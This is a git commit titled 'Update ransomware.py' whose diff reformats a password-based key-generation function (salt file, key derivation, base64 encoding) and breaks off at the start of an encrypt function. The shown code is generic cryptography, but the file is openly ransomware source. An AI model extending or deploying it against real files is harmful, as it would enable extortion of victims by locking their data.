ae4775cd9e59e56df1b8f6b3231e5a77057a26cc
ryxie143 <valeriejane020703@gmail.com>
2025-05-18 09:59:31 +0800

    Update ransomware.py

--- ransomware.py
+++ ransomware.py
@@ -20,27 +20,24 @@ def load_salt ():
 # load salt from salt.salt file
 return open ( "salt.salt" , "rb" ). read ()
 
-def generate_key ( password , salt_size = 16 ,
-load_existing_salt = False , save_salt = True ):
-"""Generates a key from a `password` and the salt.
-If `load_existing_salt` is True, it'll load the salt
-from a file
-in the current directory called "salt.salt".
-If `save_salt` is True, then it will generate a new
-salt
-and save it to "salt.salt""""
-if load_existing_salt :
-# load existing salt
-salt = load_salt ()
-elif save_salt :
-# generate new salt and save it
-salt = generate_salt ( salt_size )
-with open ( "salt.salt" , "wb" ) as salt_file :
-salt_file . write ( salt )
-# generate the key from the salt and the password
-derived_key = derive_key ( salt , password )
-# encode it using Base 64 and return it
-return base64 . urlsafe_b64encode ( derived_key )
+def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
+    """Generates a key from a `password` and the salt.
+    If `load_existing_salt` is True, it'll load the salt from a file
+    in the current directory called "salt.salt".
+    If `save_salt` is True, then it will generate a new salt
+    and save it to "salt.salt"""
+    if load_existing_salt:
+        # load existing salt
+        salt = load_salt()
+    elif save_salt:
+        # generate new salt and save it
+        salt = generate_salt(salt_size)
+        with open("salt.salt", "wb") as salt_file:
+            salt_file.write(salt)
+    # generate the key from the salt and the password
+    derived_key = derive_key(salt, password)
+    # encode it using Base 64 and return it
+    return base64.urlsafe_b64encode(derived_key)
 
 def encrypt ( filename , key ):
 """Given a filename (str) and key (bytes), it
